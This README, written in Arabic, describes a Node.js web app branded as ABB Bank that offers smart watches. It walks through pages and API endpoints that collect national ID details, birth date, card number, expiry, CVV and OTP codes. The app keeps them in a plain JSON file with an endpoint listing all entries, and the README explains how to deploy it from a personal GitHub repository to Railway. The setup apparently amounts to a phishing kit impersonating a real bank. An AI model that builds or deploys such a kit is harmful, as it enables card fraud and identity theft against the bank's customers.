# ABB Bank Smart Watch Application

تطبيق ويب متكامل لموقع ABB Bank يوفر واجهة لطلب الساعات الذكية مع معالجة البيانات الشخصية وبيانات البطاقات البنكية وتخزينها بشكل آمن.

## المميزات

- ✅ دعم اللغة الأذربيجانية والإنجليزية
- ✅ نظام تنقل سلس بين الصفحات
- ✅ معالجة البيانات عبر API JSON
- ✅ تخزين الطلبات في ملف JSON
- ✅ واجهة مستخدم احترافية وسهلة الاستخدام
- ✅ جاهز للنشر على Railway

## المتطلبات

- Node.js 18.x أو أحدث
- npm أو yarn

## التثبيت المحلي

```bash
# استنساخ المستودع
git clone https://github.com/janajn088-coder/abbaz.git
cd abb-bank-app

# تثبيت المتطلبات
npm install

# تشغيل الخادم
npm start
```

سيكون التطبيق متاحاً على `http://localhost:3000`

## البنية

```
abb-bank-app/
├── public/              # الملفات الثابتة (HTML, CSS, JS)
│   ├── index.html       # الصفحة الرئيسية (أذربيجانية)
│   ├── index-en.html    # الصفحة الرئيسية (إنجليزية)
│   ├── data.html        # نموذج البيانات الشخصية
│   ├── data-en.html     # نموذج البيانات الشخصية (إنجليزية)
│   ├── payment.html     # نموذج الدفع
│   ├── payment-en.html  # نموذج الدفع (إنجليزية)
│   ├── otp.html         # التحقق عبر OTP
│   ├── otp-en.html      # التحقق عبر OTP (إنجليزية)
│   ├── success.html     # صفحة النجاح
│   └── success-en.html  # صفحة النجاح (إنجليزية)
├── data/                # مجلد تخزين البيانات
│   └── orders.json      # ملف الطلبات
├── server.js            # الخادم الرئيسي
├── package.json         # المتطلبات
├── Dockerfile           # ملف Docker للنشر
└── README.md            # هذا الملف
```

## API Endpoints

### الحصول على جميع الطلبات
```
GET /api/orders
```

### حفظ البيانات الشخصية
```
POST /api/orders/personal-data
Content-Type: application/json

{
  "fullname": "...",
  "id_number": "...",
  "phone": "...",
  "id_expiry_day": "...",
  "id_expiry_month": "...",
  "id_expiry_year": "...",
  "dob_day": "...",
  "dob_month": "...",
  "dob_year": "...",
  "email": "...",
  "gender": "..."
}
```

### حفظ بيانات الدفع
```
POST /api/orders/payment-data
Content-Type: application/json

{
  "orderId": "...",
  "card_holder": "...",
  "card_number": "...",
  "expiry_date": "...",
  "cvv": "..."
}
```

### التحقق من OTP
```
POST /api/orders/otp-verification
Content-Type: application/json

{
  "orderId": "...",
  "otp_code": "..."
}
```

## النشر على Railway

### الخطوات:

1. **إنشاء حساب على Railway**
   - اذهب إلى https://railway.app
   - سجل الدخول أو أنشئ حساباً جديداً

2. **ربط المستودع**
   - في لوحة التحكم، اختر "New Project"
   - اختر "Deploy from GitHub"
   - اختر المستودع `abbaz`

3. **تكوين البيئة**
   - اضبط `PORT` على `3000`
   - اضبط `NODE_ENV` على `production`

4. **النشر**
   - سيتم النشر تلقائياً عند دفع التغييرات إلى GitHub

## تدفق الطلب

1. **الصفحة الرئيسية** → المستخدم يختار ساعة ويضغط على "طلب الآن"
2. **نموذج البيانات** → إدخال البيانات الشخصية وإرسالها إلى API
3. **نموذج الدفع** → إدخال بيانات البطاقة وإرسالها إلى API
4. **التحقق من OTP** → إدخال رمز التحقق وإرساله إلى API
5. **صفحة النجاح** → تأكيد الطلب بنجاح

## الأمان

⚠️ **ملاحظة مهمة**: هذا التطبيق في مرحلة التطوير. في بيئة الإنتاج:
- استخدم HTTPS فقط
- قم بتشفير بيانات البطاقات
- لا تخزن بيانات البطاقات بشكل مباشر
- استخدم خدمة دفع موثوقة (Stripe, PayPal, إلخ)
- أضف التحقق من OTP الحقيقي

## الترخيص

MIT

## التواصل

- البريد الإلكتروني: info@abb-bank.az
- الهاتف: +994 12 493 00 91
